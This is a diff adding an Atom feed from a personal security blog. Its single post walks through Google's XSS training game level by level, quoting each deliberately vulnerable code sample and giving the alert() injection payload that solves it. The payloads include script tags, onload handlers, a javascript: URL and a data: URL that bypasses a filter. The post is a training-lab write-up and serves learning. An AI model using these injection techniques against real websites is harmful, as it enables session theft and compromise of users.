@@ -1,0 +1,217 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: XSS | vinicius777 - InfoSec]]></title>
+  <link href="http://vinicius777.github.io/blog/categories/xss/atom.xml" rel="self"/>
+  <link href="http://vinicius777.github.io/"/>
+  <updated>2014-06-04T16:01:59+10:00</updated>
+  <id>http://vinicius777.github.io/</id>
+  <author>
+    <name><![CDATA[Vinicius Marino]]></name>
+    <email><![CDATA[vinicius777@gmail.com]]></email>
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[XSSing - Google Game]]></title>
+    <link href="http://vinicius777.github.io/blog/2014/06/03/xssing-google-game/"/>
+    <updated>2014-06-03T18:29:33+10:00</updated>
+    <id>http://vinicius777.github.io/blog/2014/06/03/xssing-google-game</id>
+    <content type="html"><![CDATA[<p>“At Google, they know very well how important these bugs are. In fact, Google is so serious about finding and fixing XSS issues that they are paying mercenaries up to <strong> $7,500 </strong> for dangerous XSS bugs discovered in our most sensitive products.”
+<!-- more --></p>
+
+<p>In this training program, you will learn to find and exploit XSS bugs. You’ll use this knowledge to confuse and infuriate your adversaries by preventing such bugs from happening in your applications. </p>
+
+<p>Not only poping boxes, XSS is also used to perform DDos attacks, sessions hijacking, client side attacker and may be used to perfrom social engineering (thanks to BeEF) attacks and many others.</p>
+
+<p>There will be cake at the end of the test.</p>
+
+<h2> Let's the fun begins </h2>
+
+<h4> Level1 </h4>
+
+<p>A good <code><span class="CodeRay"><span class="tag">&lt;script&gt;</span><span class="inline"> alert(<span class="string"><span class="delimiter">'</span><span class="content">XSS</span><span class="delimiter">'</span></span>) </span><span class="tag">&lt;/script&gt;</span></span></code> will solve this first level by prompting the Alert box! Simple as it! </p>
+
+<center>
+<img src="/images/level1.png" width="600" height="300">
+</center>
+
+<p>Have a look in the vulnerable code, ‘query’ is out there without any filters!</p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="CodeRay">
+  <div class="code"><pre>
+ <span class="comment"># Our search engine broke, we found no results :-(</span>
+      message = <span class="error">“</span>Sorry, no results were found <span class="keyword">for</span> &lt;b&gt;<span class="error">”</span> + query + <span class="error">“</span>&lt;/b&gt;.<span class="error">”</span>
+      message += <span class="error">“</span> &lt;a href=<span class="string"><span class="delimiter">&quot;</span><span class="content">?</span><span class="delimiter">&quot;</span></span>&gt;Try again&lt;/a&gt;.<span class="error">”</span> 
+</pre></div>
+</div>
+ </figure></notextile></div></p>
+
+<h4> Level2 </h4>
+
+<p>Keeping data on server-side should be always handle with careful by admins no matter what, even if you trust the source…</p>
+
+<center>
+<img src="/images/level2.png" width="600" height="300">
+</center>
+
+<p>It wasn’t too hard isn’t ? <code><span class="CodeRay"><span class="tag">&lt;img</span> <span class="attribute-name">src</span>=<span class="string"><span class="delimiter">&quot;</span><span class="content">https://xss-game.appspot.com/static/level2_icon.png</span><span class="delimiter">&quot;</span></span> <span class="attribute-name">onload</span>=<span class="string"><span class="delimiter">&quot;</span>alert(<span class="string"><span class="delimiter">'</span><span class="content">XSS</span><span class="delimiter">'</span></span>)<span class="delimiter">&quot;</span></span><span class="tag">&gt;</span></span></code></p>
+
+<h4>Level 3</h4>
+
+<p>Some common javascript functions runs whatever the input data holds, sometimes it’s hidden in the API or hard to see, but not invisible! </p>
+
+<center>
+<img src="/images/level3.png" width="600" height="300">
+</center>
+
+<p>We can escape the code as I did, placing ‘xss?’. There’re a couple of ways to do such a task, <code><span class="CodeRay"><span class="integer">1</span>.jpg<span class="string"><span class="delimiter">'</span><span class="content">onload=</span><span class="delimiter">'</span></span>alert(<span class="string"><span class="delimiter">&quot;</span><span class="content">xss</span><span class="delimiter">&quot;</span></span>)<span class="string"><span class="delimiter">'</span></span></span></code> ‘1.jpg is the image name located at ‘static/level3/cloud(1-3).jpg’ by sending this input, We got the following code: <code><span class="CodeRay">&lt;img src=<span class="string"><span class="delimiter">'</span><span class="content">http://vinicius777.github.io/static/level3/cloud1.jpg</span><span class="delimiter">'</span></span>onload=<span class="string"><span class="delimiter">'</span><span class="content">alert(&quot;xss&quot;)</span><span class="delimiter">'</span></span>.jpg<span class="string"><span class="delimiter">'</span><span class="content"> /&gt;</span></span></span></code> </p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="CodeRay">
+  <div class="code"><pre>
+&lt;script&gt;
+      <span class="keyword">function</span> <span class="function">chooseTab</span>(num) {
+        <span class="comment">// Dynamically load the appropriate image.</span>
+        <span class="keyword">var</span> html = <span class="string"><span class="delimiter">&quot;</span><span class="content">Image </span><span class="delimiter">&quot;</span></span> + parseInt(num) + <span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;br /&gt;</span><span class="delimiter">&quot;</span></span>;
+        html += <span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;img src=</span><span class="delimiter">&quot;</span></span>http:<span class="comment">//vinicius777.github.io/static/level3/cloud&amp;quot; + num + &amp;quot;.jpg&quot; /&gt;&quot;;</span>
+        <span class="predefined">$</span>(<span class="string"><span class="delimiter">'</span><span class="content">#tabContent</span><span class="delimiter">'</span></span>).html(html);
+ </pre></div>
+</div>
+ </figure></notextile></div></script></p>
+
+<h4> Level4 </h4>
+
+<center>
+<img src="/images/level4.png" width="600" height="300">
+</center>
+
+<p>Set the timer to 1000 to better analyse the code, and guess what I’ve found! 
+<code><span class="CodeRay"><span class="tag">&lt;img</span> <span class="attribute-name">onload</span>=<span class="string"><span class="delimiter">&quot;</span>startTimer(<span class="string"><span class="delimiter">'</span><span class="content">100</span><span class="delimiter">'</span></span>);<span class="delimiter">&quot;</span></span> <span class="attribute-name">src</span>=<span class="string"><span class="delimiter">&quot;</span><span class="content">http://vinicius777.github.io/static/loading.gif</span><span class="delimiter">&quot;</span></span><span class="tag">&gt;</span><span class="tag">&lt;/img&gt;</span></span></code></p>
+
+<p>;-) Escape would be possible! Let’s try that out, first, let’s see the timer code content.</p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="CodeRay">
+  <div class="code"><pre>
+   <span class="entity">&amp;lt;</span>body id=&quot;level4&quot;<span class="entity">&amp;gt;</span>
+    <span class="tag">&lt;img</span> <span class="attribute-name">src</span>=<span class="string"><span class="delimiter">&quot;</span><span class="content">http://vinicius777.github.io/static/logos/level4.png</span><span class="delimiter">&quot;</span></span> <span class="tag">/&gt;</span>
+    <span class="tag">&lt;br</span> <span class="tag">/&gt;</span>
+    <span class="tag">&lt;img</span> <span class="attribute-name">src</span>=<span class="string"><span class="delimiter">&quot;</span><span class="content">http://vinicius777.github.io/static/loading.gif</span><span class="delimiter">&quot;</span></span> <span class="attribute-name">onload</span>=<span class="string"><span class="delimiter">&quot;</span>startTimer(<span class="string"><span class="delimiter">'</span><span class="delimiter">'</span></span>);<span class="delimiter">&quot;</span></span> <span class="tag">/&gt;</span>
+    <span class="tag">&lt;br</span> <span class="tag">/&gt;</span>
+    <span class="entity">&amp;lt;</span>div id=&quot;message&quot;<span class="entity">&amp;gt;</span>Your timer will execute in () seconds.<span class="entity">&amp;lt;</span>/div<span class="entity">&amp;gt;</span>
+  <span class="entity">&amp;lt;</span>/body<span class="entity">&amp;gt;</span> </pre></div>
+</div>
+ </figure></notextile></div></p>
+
+<p>To inject/escape this application I got this encoded string <code>')%3Balert('XSS</code> = <code>');alert('XSS</code> and the <code>');</code> isn’t necessary as we are escaping from the application that does not checks any input. </p>
+
+<p>This is the URL: <code>https://xss-game.appspot.com/level4/frame?timer=100')%3Balert('XSS</code> that will be render as: <code><span class="CodeRay">onload=<span class="string"><span class="delimiter">&quot;</span><span class="content">startTimer('100');alert('XSS');</span><span class="delimiter">&quot;</span></span> src=<span class="string"><span class="delimiter">&quot;</span><span class="content">http://vinicius777.github.io/static/loading.gif</span><span class="delimiter">&quot;</span></span>&gt;&lt;<span class="regexp"><span class="delimiter">/</span><span class="content">img&gt;</span></span></span></code> prompting the XSS alert. </p>
+
+<h4> Level5 </h4>
+
+<center>
+<img src="/images/level5.png" width="600" height="300">
+</center>
+
+<p>Looking deeper:</p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="CodeRay">
+  <div class="code"><pre>
+&amp;lt;body id=<span class="string"><span class="delimiter">&quot;</span><span class="content">level5</span><span class="delimiter">&quot;</span></span>&amp;gt;
+<span class="error"> </span><span class="error"> </span><span class="error"> </span><span class="error"> </span>&lt;img src=<span class="string"><span class="delimiter">&quot;</span><span class="content">http://vinicius777.github.io/static/logos/level5.png</span><span class="delimiter">&quot;</span></span> /&gt;&lt;br /&gt;&lt;br /&gt;
+<span class="error"> </span><span class="error"> </span><span class="error"> </span><span class="error"> </span>Thanks <span class="keyword">for</span> signing up, you will be redirected soon<span class="error">…</span>
+<span class="error"> </span><span class="error"> </span><span class="tag">&lt;script&gt;</span>
+<span class="inline">setTimeout(<span class="keyword">function</span>() { window.location = <span class="string"><span class="delimiter">'</span><span class="delimiter">'</span></span>; }, <span class="integer">5000</span>);</span>
+<span class="tag">&lt;/script&gt;</span>
+<span class="error"> </span><span class="error"> </span>&amp;lt;<span class="regexp"><span class="delimiter">/</span><span class="content">body&amp;gt;
+</span></span></pre></div>
+</div>
+ </figure></notextile></div> </p>
+
+<p>Easy to abuse the NEXT parameter by using the URL: 
+<code>https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("XSS")</code></p>
+
+<h4> Level 6 </h4>
+
+<center>
+<img src="/images/level6.png" width="600" height="300">
+</center>
+
+<p>Complex Web applications loads dynamically javascripts localy or even remotely (http), sometime this could be a massive big truble that could allow the attacker to control yours js files by changing them or even leading to local file include, remote file include vulnerability or even others.</p>
+
+<p>Here’s the code example and how the vulnerability works:</p>
+
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="CodeRay">
+  <div class="code"><pre>
+<span class="tag">&lt;script&gt;</span>
+<span class="inline">    <span class="keyword">function</span> <span class="function">setInnerText</span>(element, value) {
+      <span class="keyword">if</span> (element.innerText) {
+        element.innerText = value;
+      } <span class="keyword">else</span> {
+        element.textContent = value;
+      }
+    }</span><span class="tag">&lt;/script&gt;</span>&lt;<span class="regexp"><span class="delimiter">/</span><span class="content">p&gt;
+
+&lt;pre&gt;&lt;code&gt;function includeGadget(url) {
+  var scriptEl = document.createElement('script');
+ 
+  </span><span class="delimiter">/</span></span>/ This will totally prevent us from loading evil URLs!
+  <span class="keyword">if</span> (url.match(<span class="regexp"><span class="delimiter">/</span><span class="content">^https?:</span><span class="content">\/</span><span class="content">\/</span><span class="delimiter">/</span></span>)) {
+    setInnerText(document.getElementById(<span class="string"><span class="delimiter">&quot;</span><span class="content">log</span><span class="delimiter">&quot;</span></span>),
+      <span class="string"><span class="delimiter">&quot;</span><span class="content">Sorry, cannot load a URL containing </span><span class="char">\&quot;</span><span class="content">http</span><span class="char">\&quot;</span><span class="content">.</span><span class="delimiter">&quot;</span></span>);
+    <span class="keyword">return</span>;
+  }
+ 
+  <span class="comment">// Load this awesome gadget</span>
+  scriptEl.src = url;
+ 
+  <span class="comment">// Show log messages</span>
+  scriptEl.<span class="function">onload</span> = <span class="keyword">function</span>() { 
+    setInnerText(document.getElementById(<span class="string"><span class="delimiter">&quot;</span><span class="content">log</span><span class="delimiter">&quot;</span></span>),  
+      <span class="string"><span class="delimiter">&quot;</span><span class="content">Loaded gadget from </span><span class="delimiter">&quot;</span></span> + url);
+  }
+  scriptEl.<span class="function">onerror</span> = <span class="keyword">function</span>() { 
+    setInnerText(document.getElementById(<span class="string"><span class="delimiter">&quot;</span><span class="content">log</span><span class="delimiter">&quot;</span></span>),  
+      <span class="string"><span class="delimiter">&quot;</span><span class="content">Couldn't load gadget from </span><span class="delimiter">&quot;</span></span> + url);
+  }
+ 
+  document.head.appendChild(scriptEl);
+}
+ 
+<span class="comment">// Take the value after # and use it as the gadget filename.</span>
+<span class="keyword">function</span> <span class="function">getGadgetName</span>() { 
+  <span class="keyword">return</span> window.location.hash.substr(<span class="integer">1</span>) || <span class="string"><span class="delimiter">&quot;</span><span class="content">/static/gadget.js</span><span class="delimiter">&quot;</span></span>;
+}
+ 
+includeGadget(getGadgetName());
+ 
+<span class="comment">// Extra code so that we can communicate with the parent page</span>
+window.addEventListener(<span class="string"><span class="delimiter">&quot;</span><span class="content">message</span><span class="delimiter">&quot;</span></span>, <span class="keyword">function</span>(event){
+  <span class="keyword">if</span> (event.source == parent) {
+    includeGadget(getGadgetName());
+  }
+}, <span class="predefined-constant">false</span>);
+ 
+&amp;lt;<span class="regexp"><span class="delimiter">/</span><span class="content">script&amp;gt; </span></span></pre></div>
+</div>
+ </figure></notextile></div>
+</code></pre>
+
+<p>The code protects ‘http://’ requests, so loading evil JS files is not possible using http requests. But whatever is after the value ‘#’ is loaded as ‘gadget filename’ by the application, so We could try a little trick!</p>
+
+<p><code>https://xss-game.appspot.com/level6/frame#data:text/javascript,alert('XSS')</code></p>
+
+<center>
+<img src="/images/level6_1.png" width="600" height="300">
+</center>
+
+<h3> The cake </h3>
+
+<p>Once you finish all levels, Google drives you to the Web Application Security Document if you want to leard more about XSS attacks. Worth the reading! <a href="https://www.google.com/about/appsecurity/learning/xss/index.html" target="_black"> Google Application Security Cheet </a></p>
+
+<p>Hope you like it! </p>
+
+]]></content>
+  </entry>
+  
+</feed>
